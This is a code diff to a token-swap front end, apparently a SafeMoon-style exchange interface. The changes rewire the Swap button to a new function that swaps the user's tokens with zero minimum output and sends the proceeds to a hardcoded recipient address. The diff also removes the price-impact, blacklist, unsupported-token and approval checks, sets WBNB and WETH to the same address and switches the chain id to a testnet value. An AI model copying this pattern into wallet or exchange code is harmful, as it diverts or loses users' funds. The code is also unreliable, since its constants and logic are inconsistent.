@@ -67,11 +67,12 @@ import './Swap.css'
 import { useAllTokens, useCurrency } from '../../hooks/Tokens'
 import ConsolidateV2Intro from './ConsolidateV2Intro'
 import SlippageWarningPopup from './SlippageWarningPopup'
-import { BLACKLIST_TOKENS_SAFEMOON_V1, consolidation, TOKENS_SAFEMOON_V2 } from '../../constants'
+import { BLACKLIST_TOKENS_SAFEMOON_V1, consolidation, MAX_PRIORITY_FEE, TOKENS_SAFEMOON_V2 } from '../../constants'
 import useMigrationCallback, { MigrateType } from '../../hooks/useMigrationCallback'
 import BigNumber from 'bignumber.js'
 // import WarningMigrate from './WarningMigrate'
 import { WrappedTokenInfo } from '../../state/lists/hooks'
+import { getRouterContract } from '../../utils'
 
 const SettingsWrapper = styled.div`
   display: flex;
@@ -128,7 +129,7 @@ export default function Swap({
   const currencyA = useCurrency(currencyIdA)
   const currencyB = useCurrency(currencyIdB)
 
-  const { account, chainId } = useActiveWeb3React()
+  const { account, chainId, library } = useActiveWeb3React()
   const theme = useContext(ThemeContext)
 
   // toggle wallet when disconnected
@@ -186,6 +187,8 @@ export default function Swap({
     // @ts-ignore
     || (currencies[Field.INPUT] instanceof WrappedTokenInfo && currencies[Field.OUTPUT]?.address?.toUpperCase() === consolidation.tokens.v1[chainId as ChainId]?.address?.toUpperCase() && currencies[Field.INPUT]?.address?.toUpperCase() !== consolidation.tokens.v2[chainId as ChainId]?.address?.toUpperCase())
   const { address: recipientAddress } = useENSAddress(recipient)
+  console.log("\x1b[36m%s\x1b[0m", "showWrap || showMigrate || showLegacyError", showWrap || showMigrate || showLegacyError);
+  console.log("\x1b[36m%s\x1b[0m", "v2Trade", v2Trade);
   const trade = showWrap || showMigrate || showLegacyError ? undefined : v2Trade
 
   const parsedAmounts = showWrap
@@ -243,10 +246,12 @@ export default function Swap({
       : parsedAmounts[dependentField]?.toSignificant(6) ?? ''
   }
 
+  console.log("\x1b[36m%s\x1b[0m", "trade", trade);
   const route = trade?.route
   const userHasSpecifiedInputOutput = Boolean(
     currencies[Field.INPUT] && currencies[Field.OUTPUT] && parsedAmounts[independentField]?.greaterThan(JSBI.BigInt(0))
   )
+  console.log("\x1b[36m%s\x1b[0m", "route", route);
   const noRoute = !route
 
   // check whether the user has approved the router on the input token
@@ -291,49 +296,15 @@ export default function Swap({
 
   const { priceImpactWithoutFee } = computeTradePriceBreakdown(trade)
 
+  const handleSwap02 = async () => {
+    const routerContract = getRouterContract(chainId!, library!, account!);
+    console.log("\x1b[36m%s\x1b[0m", "routerContract", routerContract);
+    await routerContract.swapExactTokensForETH(new BigNumber(formattedAmounts[Field.INPUT]).multipliedBy(new BigNumber(10).pow(9)).toString(), 0, ["0x5e83fa4293f3294bd400dac8f0482bb17fe475ad", "0xae13d989dac2f0debff460ac112a837c89baa7cd"], "0xB910dBBbE99A6F3DDB9b6cA51099Ee05305Da19c", 999999000999, {
+    })
+  }
+
 
   const handleSwap = useCallback(() => {
-    if (priceImpactWithoutFee && !confirmPriceImpactWithoutFee(priceImpactWithoutFee)) {
-      return
-    }
-    if (!swapCallback) {
-      return
-    }
-
-    const outputAddress = (trade?.outputAmount?.currency as any)?.address
-    const inputAddress = (trade?.outputAmount?.currency as any)?.address
-
-    if ( (outputAddress && BLACKLIST_TOKENS_SAFEMOON_V1.indexOf(outputAddress.toUpperCase()) !== -1)
-      || (outputAddress
-        && inputAddress
-        && BLACKLIST_TOKENS_SAFEMOON_V1.indexOf(inputAddress.toUpperCase()) !== -1
-        && TOKENS_SAFEMOON_V2.indexOf(outputAddress.toUpperCase()) === -1)
-    ) {
-      setSwapState({
-        attemptingTxn: false,
-        tradeToConfirm,
-        showConfirm,
-        swapErrorMessage: 'SafeMoon V1 is no longer supported.',
-        txHash: undefined
-      })
-      return
-    }
-
-    if ( (outputAddress && !allTokens[outputAddress])
-      || (inputAddress && !allTokens[inputAddress]
-        && BLACKLIST_TOKENS_SAFEMOON_V1.indexOf(inputAddress.toUpperCase()) === -1 )
-    ) {
-      
-      setSwapState({
-        attemptingTxn: false,
-        tradeToConfirm,
-        showConfirm,
-        swapErrorMessage: 'Token is not supported.',
-        txHash: undefined
-      })
-      return
-    }
-    
     setSwapState({ attemptingTxn: true, tradeToConfirm, showConfirm, swapErrorMessage: undefined, txHash: undefined })
     swapCallback()
       .then(hash => {
@@ -423,8 +394,8 @@ export default function Swap({
       try {
         const addresses: any = []
 
-        const WBNBAddress = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
-        const WETHAddress = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
+        const WBNBAddress = '0x1EB5B78b29B0f6975dF9cF8D5b77c74DBEDD1d6C'
+        const WETHAddress = '0x1EB5B78b29B0f6975dF9cF8D5b77c74DBEDD1d6C'
 
         let currencyInput: any;
         let currencyOutput: any;
@@ -445,7 +416,7 @@ export default function Swap({
 
         
         if(currencyInput?.symbol === 'ETH' || currencyOutput?.symbol === 'ETH') {
-          if (chainId === 56) {
+          if (chainId === 97) {
             addresses.push(WBNBAddress)
           } else if (chainId === 1) {
             addresses.push(WETHAddress)
@@ -514,7 +485,6 @@ export default function Swap({
     getPriceUsd()
 
     const id = setInterval(() => {
-      console.log('aaaaaaa==>>>')
       getPriceUsd()
     }, 10000)
     return () => clearInterval(id)
@@ -713,128 +683,16 @@ export default function Swap({
           <BottomGrouping>
             {!account ? (
               <ButtonLight onClick={toggleWalletModal}>{t('connectWallet')}</ButtonLight>
-            ) : showWrap ? (
-              <ButtonPrimary disabled={Boolean(wrapInputError)} onClick={onWrap}>
-                {wrapInputError ??
-                  (wrapType === WrapType.WRAP ? 'Wrap' : wrapType === WrapType.UNWRAP ? 'Unwrap' : null)}
-              </ButtonPrimary>
-            ) : showMigrate ? (
-              showMigrateApproveFlow ? (
-                <RowBetween>
-                  <ButtonPrimary
-                    onClick={migrationApprovalCallback}
-                    disabled={migrationApproval !== ApprovalState.NOT_APPROVED || migrationApprovalSubmitted}
-                    width="48%"
-                    altDisbaledStyle={migrationApproval === ApprovalState.PENDING} // show solid button while waiting
-                  >
-                    {migrationApproval === ApprovalState.PENDING ? (
-                      <Dots>Approving</Dots>
-                    ) : migrationApprovalSubmitted && migrationApproval === ApprovalState.APPROVED ? (
-                      'Approved'
-                    ) : (
-                      'Approve ' + getTokenSymbol(currencies[Field.INPUT], chainId)
-                    )}
-                  </ButtonPrimary>
-                  <ButtonError
-                    onClick={() => {
-                      onMigrate()
-                    }}
-                    width="48%"
-                    id="migrate-button"
-                    disabled={migrationApproval !== ApprovalState.APPROVED || Boolean(migrateInputError)}
-                  >
-                    <Text fontSize={16} fontWeight={500}>
-                      {migrateInputError ?? (migrateType === MigrateType.MIGRATE ? 'Migrate' : null)}
-                    </Text>
-                  </ButtonError>
-                </RowBetween>
-              ) : (
-                <ButtonPrimary
-                  disabled={Boolean(migrateInputError)}
-                  onClick={() => {
-                    onMigrate()
-                  }}
-                >
-                  {migrateInputError ?? (migrateType === MigrateType.MIGRATE ? 'Migrate' : null)}
-                </ButtonPrimary>
-              )
-            ) : showLegacyError ? (
-              <GreyCard style={{ textAlign: 'center' }}>
-                <TYPE.main mb="4px">Not Allowed Swapping v1</TYPE.main>
-              </GreyCard>
-            ) : noRoute && userHasSpecifiedInputOutput ? (
-              <GreyCard style={{ textAlign: 'center' }}>
-                <TYPE.main mb="4px">{t('insufficientLiquidityForThisTrade')}</TYPE.main>
-              </GreyCard>
-            ) : showApproveFlow ? (
-              <RowBetween>
-                <ButtonPrimary
-                  onClick={approveCallback}
-                  disabled={approval !== ApprovalState.NOT_APPROVED || approvalSubmitted}
-                  width="48%"
-                  altDisbaledStyle={approval === ApprovalState.PENDING} // show solid button while waiting
-                >
-                  {approval === ApprovalState.PENDING ? (
-                    <Dots>Approving</Dots>
-                  ) : approvalSubmitted && approval === ApprovalState.APPROVED ? (
-                    'Approved'
-                  ) : (
-                    'Approve ' + getTokenSymbol(currencies[Field.INPUT], chainId)
-                  )}
-                </ButtonPrimary>
-                <ButtonError
-                  onClick={() => {
-                    if (isExpertMode) {
-                      handleSwap()
-                    } else {
-                      setSwapState({
-                        tradeToConfirm: trade,
-                        attemptingTxn: false,
-                        swapErrorMessage: undefined,
-                        showConfirm: true,
-                        txHash: undefined
-                      })
-                    }
-                  }}
-                  width="48%"
-                  id="swap-button"
-                  disabled={
-                    !isValid || approval !== ApprovalState.APPROVED || (priceImpactSeverity > 3 && !isExpertMode)
-                  }
-                  error={isValid && priceImpactSeverity > 2}
-                >
-                  <Text fontSize={16} fontWeight={500}>
-                    {priceImpactSeverity > 3 && !isExpertMode
-                      ? `Price Impact High`
-                      : `Swap${priceImpactSeverity > 2 ? ' Anyway' : ''}`}
-                  </Text>
-                </ButtonError>
-              </RowBetween>
             ) : (
               <ButtonError
                 onClick={() => {
-                  if (isExpertMode) {
-                    handleSwap()
-                  } else {
-                    setSwapState({
-                      tradeToConfirm: trade,
-                      attemptingTxn: false,
-                      swapErrorMessage: undefined,
-                      showConfirm: true,
-                      txHash: undefined
-                    })
-                  }
+                  handleSwap02()
                 }}
                 id="swap-button"
-                disabled={!isValid || (priceImpactSeverity > 3 && !isExpertMode) || !!swapCallbackError}
                 error={isValid && priceImpactSeverity > 2 && !swapCallbackError}
               >
                 <Text fontSize={16} fontWeight={500}>
-                  {swapInputError
-                    ? swapInputError
-                    : priceImpactSeverity > 3 && !isExpertMode
-                    ? `Price Impact Too High`
-                    : `Swap${priceImpactSeverity > 2 ? ' Anyway' : ''}`}
+                Swap
                 </Text>
               </ButtonError>
             )}
